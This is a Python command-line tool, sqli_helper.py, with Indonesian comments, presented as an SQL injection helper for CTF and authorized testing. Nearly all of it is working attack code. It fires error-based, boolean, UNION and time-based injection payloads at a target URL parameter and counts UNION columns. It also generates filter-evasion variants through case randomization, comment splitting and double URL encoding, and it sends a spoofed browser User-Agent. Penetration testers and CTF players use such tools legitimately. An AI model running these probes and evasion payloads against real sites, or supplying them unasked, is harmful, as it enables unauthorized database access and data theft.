#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""sqli_helper.py — SQL injection helper buat CTF & authorized testing.

Fitur:
  - probe: kirim payload set ke endpoint, deteksi error-based
  - blind: time-based blind detector (benchmark + threshold)
  - tamper: generate tamper payload variants (case, comment, encoding)
  - union: UNION-based column counter

    python3 sqli_helper.py probe --url "http://target/item?id=1" --param id
    python3 sqli_helper.py blind --url "http://target/item?id=1" --param id --delay 5
    python3 sqli_helper.py tamper --payload "' OR 1=1--"
    python3 sqli_helper.py union --url "http://target/item?id=1" --param id
"""
import argparse, random, string, sys, time, urllib.error, urllib.parse, urllib.request

UA = "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0 Safari/537.36"
ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "pg_query", "sqlite_query",
    "ORA-", "Microsoft OLE DB", "ODBC SQL Server Driver",
    "supplied argument is not a valid MySQL", "unclosed quotation mark",
    "you have an error in your sql syntax", "warning: mysql",
    "sqlserver jdbc", "postgresql query failed",
]

def http_get(url, timeout=15):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(500_000).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(500_000).decode("utf-8", errors="replace")
    except Exception as e:
        return None, str(e)

def probe(url, param):
    print(f"[*] Probing {url} param={param}")
    base = url.split("?")[0]
    qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
    payloads = [
        "'", "\"", "')", "'))", "';", "\";", "' OR '1'='1", "' OR 1=1--",
        "1' AND '1'='1", "1 AND 1=1", "1 AND 1=2",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--", "' OR pg_sleep(5)--",
    ]
    for p in payloads:
        qs[param] = [p]
        test_url = base + "?" + urllib.parse.urlencode(qs)
        status, body = http_get(test_url)
        if status is None:
            print(f"  [ERR] {p[:30]:30} -> connection error")
            continue
        for sig in ERROR_SIGNATURES:
            if sig.lower() in body.lower():
                print(f"  [!!!] SQLi DETECTED: {p[:40]:40} -> '{sig}'")
                print(f"        URL: {test_url[:100]}")
                return p
        print(f"  [---] {p[:40]:40} -> {status}")
    print("[-] Tidak ada SQLi error-based terdeteksi")
    return None

def blind(url, param, delay=5):
    print(f"[*] Time-based blind SQLi test (delay={delay}s)")
    base = url.split("?")[0]
    qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
    # Benchmark normal
    t0 = time.time()
    qs[param] = ["1"]
    normal_url = base + "?" + urllib.parse.urlencode(qs)
    http_get(normal_url)
    baseline = time.time() - t0
    print(f"  Baseline: {baseline:.2f}s")
    payloads = [
        f"' OR SLEEP({delay})--",
        f"' OR pg_sleep({delay})--",
        f"'; WAITFOR DELAY '0:0:{delay}'--",
        f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
        f"1' AND BENCHMARK(10000000,SHA1('x'))--",
    ]
    for p in payloads:
        qs[param] = [p]
        test_url = base + "?" + urllib.parse.urlencode(qs)
        t0 = time.time()
        http_get(test_url, timeout=delay + 10)
        elapsed = time.time() - t0
        if elapsed >= delay * 0.8:
            print(f"  [!!!] TIME-BASED SQLi: {p[:50]:50} -> {elapsed:.2f}s")
            return p
        print(f"  [---] {p[:50]:50} -> {elapsed:.2f}s")
    print("[-] Tidak ada time-based SQLi terdeteksi")
    return None

def tamper(payload):
    print(f"[*] Tamper variants untuk: {payload}")
    variants = set()
    variants.add(payload)
    # Case randomization
    v = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    variants.add(v)
    # Comment injection
    variants.add(payload.replace(" ", "/**/"))
    variants.add(payload.replace(" ", "%0a"))
    variants.add(payload.replace(" ", "%09"))
    # URL encode
    variants.add(urllib.parse.quote(payload))
    variants.add(urllib.parse.quote(payload, safe=""))
    # Double URL encode
    variants.add(urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""))
    # Space variants
    variants.add(payload.replace(" ", "+"))
    variants.add(payload.replace(" ", "%0b"))
    # Keyword split
    variants.add(payload.replace("SELECT", "SEL/**/ECT"))
    variants.add(payload.replace("UNION", "UNI/**/ON"))
    variants.add(payload.replace("OR", "O/**/R"))
    for i, v in enumerate(sorted(variants), 1):
        print(f"  {i:2}. {v}")
    return list(variants)

def union(url, param):
    print(f"[*] UNION column counter: {url}")
    base = url.split("?")[0]
    qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
    for n in range(1, 21):
        nulls = ",".join(["NULL"] * n)
        qs[param] = [f"' UNION SELECT {nulls}--"]
        test_url = base + "?" + urllib.parse.urlencode(qs)
        status, body = http_get(test_url)
        if status and status != 500:
            print(f"  [+] {n} columns -> HTTP {status}")
            return n
        print(f"  [---] {n} columns -> {status}")
    print("[-] Tidak bisa tentukan jumlah kolom")
    return None

def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        return
    cmd = args[0]
    if cmd == "probe":
        p = argparse.ArgumentParser()
        p.add_argument("--url", required=True)
        p.add_argument("--param", required=True)
        a = p.parse_args(args[1:])
        probe(a.url, a.param)
    elif cmd == "blind":
        p = argparse.ArgumentParser()
        p.add_argument("--url", required=True)
        p.add_argument("--param", required=True)
        p.add_argument("--delay", type=int, default=5)
        a = p.parse_args(args[1:])
        blind(a.url, a.param, a.delay)
    elif cmd == "tamper":
        p = argparse.ArgumentParser()
        p.add_argument("--payload", required=True)
        a = p.parse_args(args[1:])
        tamper(a.payload)
    elif cmd == "union":
        p = argparse.ArgumentParser()
        p.add_argument("--url", required=True)
        p.add_argument("--param", required=True)
        a = p.parse_args(args[1:])
        union(a.url, a.param)
    else:
        print(__doc__)

if __name__ == "__main__":
    main()
